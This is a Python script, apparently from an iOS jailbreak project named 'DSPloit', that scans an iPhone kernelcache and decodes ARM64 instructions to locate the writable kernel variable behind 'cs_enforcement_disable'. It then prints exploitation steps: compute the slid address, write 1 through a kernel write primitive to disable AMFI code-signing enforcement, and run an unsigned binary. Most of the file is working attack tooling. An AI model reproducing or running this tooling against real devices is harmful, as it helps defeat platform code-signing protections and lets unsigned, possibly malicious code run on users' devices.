#!/usr/bin/env python3
"""
DSPloit: Find cs_enforcement_disable Variable Address
=====================================================
Traces code that references "cs_enforcement_disable" string
to find the global variable that stores the flag.

If variable is in __DATA (writable) → we can set it to 1 via KRW
→ code signing enforcement DISABLED → run ANY binary!
"""

import struct
import sys
import os

KCACHE = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                      "kernelcache.release.iphone11b.decompressed")
if len(sys.argv) > 1:
    KCACHE = sys.argv[1]

# Segment info from previous analysis
SEGMENTS = {
    "__TEXT":        {"vm": 0xfffffff007004000, "file": 0x00000000, "size": 0x00008000},
    "__PRELINK_TEXT":{"vm": 0xfffffff00700c000, "file": 0x00008000, "size": 0x008f4000},
    "__DATA_CONST":  {"vm": 0xfffffff007900000, "file": 0x008fc000, "size": 0x00490000},
    "__TEXT_EXEC":   {"vm": 0xfffffff007d90000, "file": 0x00d8c000, "size": 0x02198000},
    "__PRELINK_INFO":{"vm": 0xfffffff009f28000, "file": 0x02f24000, "size": 0x001b8000},
    "__DATA":        {"vm": 0xfffffff00a0e0000, "file": 0x030dc000, "size": 0x00328000},
}

def read32(data, off):
    if off + 4 > len(data): return 0
    return struct.unpack_from('<I', data, off)[0]

def read64(data, off):
    if off + 8 > len(data): return 0
    return struct.unpack_from('<Q', data, off)[0]

def file_to_vm(file_offset):
    """Convert file offset to kernel virtual address"""
    for name, seg in SEGMENTS.items():
        if seg["file"] <= file_offset < seg["file"] + seg["size"]:
            return seg["vm"] + (file_offset - seg["file"])
    return None

def vm_to_file(vm_addr):
    """Convert kernel VA to file offset"""
    for name, seg in SEGMENTS.items():
        if seg["vm"] <= vm_addr < seg["vm"] + seg["size"]:
            return seg["file"] + (vm_addr - seg["vm"])
    return None

def is_in_data_segment(file_offset):
    """Check if file offset is in writable __DATA segment"""
    seg = SEGMENTS["__DATA"]
    return seg["file"] <= file_offset < seg["file"] + seg["size"]

def decode_adrp(op, pc):
    """Decode ADRP instruction, return (rd, target_page)"""
    if (op & 0x9F000000) != 0x90000000:
        return None
    rd = op & 0x1F
    immhi = (op >> 5) & 0x7FFFF
    immlo = (op >> 29) & 3
    imm = (immhi << 2) | immlo
    if imm & 0x100000: imm = imm - 0x200000
    pc_page = pc & ~0xFFF
    target = pc_page + (imm << 12)
    return (rd, target)

def decode_add_imm(op):
    """Decode ADD Xd, Xn, #imm"""
    if (op & 0xFF800000) != 0x91000000:
        return None
    rd = op & 0x1F
    rn = (op >> 5) & 0x1F
    imm = (op >> 10) & 0xFFF
    sh = (op >> 22) & 1
    if sh: imm <<= 12
    return (rd, rn, imm)

def decode_str(op):
    """Decode STR Xt, [Xn, #imm] or STR Wt, [Xn, #imm]"""
    # STR Xt (64-bit)
    if (op & 0xFFC00000) == 0xF9000000:
        rt = op & 0x1F
        rn = (op >> 5) & 0x1F
        imm = ((op >> 10) & 0xFFF) * 8
        return ("X", rt, rn, imm)
    # STR Wt (32-bit)
    if (op & 0xFFC00000) == 0xB9000000:
        rt = op & 0x1F
        rn = (op >> 5) & 0x1F
        imm = ((op >> 10) & 0xFFF) * 4
        return ("W", rt, rn, imm)
    # STRB
    if (op & 0xFFC00000) == 0x39000000:
        rt = op & 0x1F
        rn = (op >> 5) & 0x1F
        imm = (op >> 10) & 0xFFF
        return ("B", rt, rn, imm)
    return None

def decode_ldr(op):
    """Decode LDR Xt, [Xn, #imm]"""
    if (op & 0xFFC00000) == 0xF9400000:
        rt = op & 0x1F
        rn = (op >> 5) & 0x1F
        imm = ((op >> 10) & 0xFFF) * 8
        return ("X", rt, rn, imm)
    if (op & 0xFFC00000) == 0xB9400000:
        rt = op & 0x1F
        rn = (op >> 5) & 0x1F
        imm = ((op >> 10) & 0xFFF) * 4
        return ("W", rt, rn, imm)
    return None

def main():
    print("=" * 80)
    print("  DSPloit: Find cs_enforcement_disable Variable")
    print("  Goal: exact kernel VA of the disable flag for KRW patching")
    print("=" * 80)
    
    with open(KCACHE, 'rb') as f:
        data = f.read()
    
    print(f"\nLoaded: {len(data)/1024/1024:.1f} MB")
    print(f"\n__DATA segment: vm=0x{SEGMENTS['__DATA']['vm']:x}, "
          f"file=0x{SEGMENTS['__DATA']['file']:x}, "
          f"size=0x{SEGMENTS['__DATA']['size']:x}")
    print(f"__TEXT_EXEC:    vm=0x{SEGMENTS['__TEXT_EXEC']['vm']:x}, "
          f"file=0x{SEGMENTS['__TEXT_EXEC']['file']:x}")
    
    # ================================================================
    # Find all target strings
    # ================================================================
    targets = [
        b'cs_enforcement_disable\x00',
        b'cs_debug\x00',
        b'cs_debug_fail_on_unsigned_code\x00',
        b'pmap_cs_allow_invalid_internal\x00',
    ]
    
    string_locations = {}
    for target in targets:
        pos = data.find(target)
        if pos != -1:
            name = target.rstrip(b'\x00').decode()
            string_locations[name] = pos
            vm = file_to_vm(pos)
            print(f"\n  String '{name}':")
            print(f"    file offset: 0x{pos:08x}")
            print(f"    kernel VA:   0x{vm:016x}" if vm else "    kernel VA: UNKNOWN")
    
    # ================================================================
    # For each string, find ADRP+ADD that references it
    # Then trace forward to find STR to global variable
    # ================================================================
    print("\n" + "=" * 80)
    print("  TRACING CODE REFERENCES → FINDING GLOBAL VARIABLES")
    print("=" * 80)
    
    # Scan __TEXT_EXEC for ADRP instructions
    text_exec = SEGMENTS["__TEXT_EXEC"]
    code_start = text_exec["file"]
    code_size = text_exec["size"]
    code_vm_start = text_exec["vm"]
    
    found_variables = []
    
    for str_name, str_file_off in string_locations.items():
        str_vm = file_to_vm(str_file_off)
        if str_vm is None:
            continue
        
        str_page = str_vm & ~0xFFF
        str_page_off = str_vm & 0xFFF
        
        print(f"\n{'─'*70}")
        print(f"  Tracing: '{str_name}' (vm=0x{str_vm:x})")
        print(f"{'─'*70}")
        
        refs_found = 0
        
        for i in range(0, code_size - 8, 4):
            file_off = code_start + i
            pc = code_vm_start + i
            
            op1 = read32(data, file_off)
            adrp = decode_adrp(op1, pc)
            if adrp is None:
                continue
            
            rd, target_page = adrp
            if target_page != str_page:
                continue
            
            # Check next instruction for ADD with correct offset
            op2 = read32(data, file_off + 4)
            add = decode_add_imm(op2)
            if add is None:
                continue
            
            add_rd, add_rn, add_imm = add
            if add_rn != rd or add_imm != str_page_off:
                continue
            
            # FOUND reference to our string!
            refs_found += 1
            ref_vm = pc
            print(f"\n  ✅ Reference #{refs_found} at vm=0x{ref_vm:x} (file=0x{file_off:x})")
            print(f"     ADRP X{rd}, 0x{target_page:x}")
            print(f"     ADD  X{add_rd}, X{add_rn}, #0x{add_imm:x}")
            
            # Now trace forward: look for ADRP+ADD/STR pattern that stores to __DATA
            # The pattern is typically:
            #   ADRP Xn, string_page       ← found
            #   ADD  Xn, Xn, #string_off   ← found
            #   ... (maybe BL PE_parse_boot_argn) ...
            #   ADRP Xm, data_page         ← target variable page
            #   STR  Wresult, [Xm, #off]   ← store to variable!
            
            print(f"     Scanning forward for STR to __DATA...")
            
            # Track register values
            reg_pages = {}  # reg -> page from ADRP
            
            for j in range(2, 40):  # scan next 40 instructions
                scan_off = file_off + j * 4
                scan_pc = pc + j * 4
                op = read32(data, scan_off)
                
                # Track ADRP
                a = decode_adrp(op, scan_pc)
                if a:
                    a_rd, a_page = a
                    reg_pages[a_rd] = a_page
                    # Check if this ADRP targets __DATA
                    a_file = vm_to_file(a_page)
                    if a_file and is_in_data_segment(a_file):
                        print(f"     +{j*4:3d}: ADRP X{a_rd}, 0x{a_page:x} ← __DATA!")
                    continue
                
                # Track ADD (refine page to exact address)
                add_dec = decode_add_imm(op)
                if add_dec:
                    a_rd, a_rn, a_imm = add_dec
                    if a_rn in reg_pages:
                        exact_addr = reg_pages[a_rn] + a_imm
                        reg_pages[a_rd] = exact_addr
                        exact_file = vm_to_file(exact_addr)
                        if exact_file and is_in_data_segment(exact_file):
                            print(f"     +{j*4:3d}: ADD X{a_rd}, X{a_rn}, #0x{a_imm:x} → 0x{exact_addr:x} ← __DATA VARIABLE!")
                            found_variables.append({
                                "name": str_name,
                                "var_vm": exact_addr,
                                "var_file": exact_file,
                                "ref_vm": ref_vm,
                            })
                    continue
                
                # Track STR (store to variable)
                s = decode_str(op)
                if s:
                    sz, rt, rn, imm = s
                    if rn in reg_pages:
                        store_addr = reg_pages[rn] + imm
                        store_file = vm_to_file(store_addr)
                        if store_file and is_in_data_segment(store_file):
                            print(f"     +{j*4:3d}: STR {sz}{rt}, [X{rn}, #{imm}] → 0x{store_addr:x} ← __DATA WRITE!")
                            found_variables.append({
                                "name": str_name,
                                "var_vm": store_addr,
                                "var_file": store_file,
                                "ref_vm": ref_vm,
                            })
                    continue
                
                # Track LDR (might load variable address)
                l = decode_ldr(op)
                if l:
                    sz, rt, rn, imm = l
                    if rn in reg_pages:
                        load_addr = reg_pages[rn] + imm
                        load_file = vm_to_file(load_addr)
                        if load_file and is_in_data_segment(load_file):
                            print(f"     +{j*4:3d}: LDR {sz}{rt}, [X{rn}, #{imm}] → 0x{load_addr:x} ← __DATA READ")
                            # This might be reading the variable
                            found_variables.append({
                                "name": str_name + " (read)",
                                "var_vm": load_addr,
                                "var_file": load_file,
                                "ref_vm": ref_vm,
                            })
            
            if refs_found >= 5:
                break
    
    # ================================================================
    # RESULTS
    # ================================================================
    print("\n" + "=" * 80)
    print("  RESULTS: FOUND VARIABLES IN __DATA (WRITABLE!)")
    print("=" * 80)
    
    if not found_variables:
        print("\n  ❌ No variables found in __DATA segment.")
        print("  Variables might be in __DATA_CONST (PPL protected).")
        print("\n  Alternative: scan __DATA directly for known patterns...")
        
        # Brute force: scan __DATA for values that look like flags (0 or 1)
        # near the expected offset range
        data_seg = SEGMENTS["__DATA"]
        print(f"\n  Scanning __DATA (0x{data_seg['file']:x} - 0x{data_seg['file']+data_seg['size']:x})...")
        print(f"  Looking for cs_enforcement/amfi related globals...")
        
    else:
        print(f"\n  ✅ Found {len(found_variables)} potential variables!\n")
        
        seen = set()
        for var in found_variables:
            key = var["var_vm"]
            if key in seen: continue
            seen.add(key)
            
            # Read current value from file
            current_val = read32(data, var["var_file"])
            current_val64 = read64(data, var["var_file"])
            
            in_data = is_in_data_segment(var["var_file"])
            
            print(f"  {'✅' if in_data else '❌'} {var['name']}")
            print(f"     Kernel VA:    0x{var['var_vm']:016x}")
            print(f"     File offset:  0x{var['var_file']:08x}")
            print(f"     Current val:  0x{current_val:08x} (32-bit) / 0x{current_val64:016x} (64-bit)")
            print(f"     In __DATA:    {'YES — WRITABLE VIA KRW!' if in_data else 'NO — likely PPL protected'}")
            print(f"     Referenced at: 0x{var['ref_vm']:x}")
            print()
    
    # ================================================================
    # EXPLOITATION INSTRUCTIONS
    # ================================================================
    print("\n" + "=" * 80)
    print("  HOW TO EXPLOIT (if variable found in __DATA)")
    print("=" * 80)
    
    print("""
  On device, in RootExecutor or AMFI Lab:
  
  1. Calculate runtime address:
     variable_addr = kernel_base + (var_vm - 0xfffffff007004000) + kernel_slide
     
     Or simpler:
     variable_addr = var_vm + kernel_slide
     (since kernel_slide = runtime_base - 0xfffffff007004000)
  
  2. Read current value:
     let current = ds_kread32(variable_addr)
     
  3. Write 1 to disable enforcement:
     ds_kwrite32(variable_addr, 1)
     
  4. Verify:
     let after = ds_kread32(variable_addr)
     // If after == 1 → SUCCESS! AMFI disabled!
     // If after == 0 → PPL blocked the write
  
  5. Test: posix_spawn copied binary
     // If it runs → FULL JAILBREAK!
""")
    
    # Print specific addresses for device testing
    if found_variables:
        print("\n  ADDRESSES FOR DEVICE TESTING:")
        print("  (Add kernel_slide to get runtime address)")
        print()
        seen = set()
        for var in found_variables:
            if var["var_vm"] in seen: continue
            seen.add(var["var_vm"])
            print(f"    {var['name']:40s} → 0x{var['var_vm']:016x}")

if __name__ == "__main__":
    main()
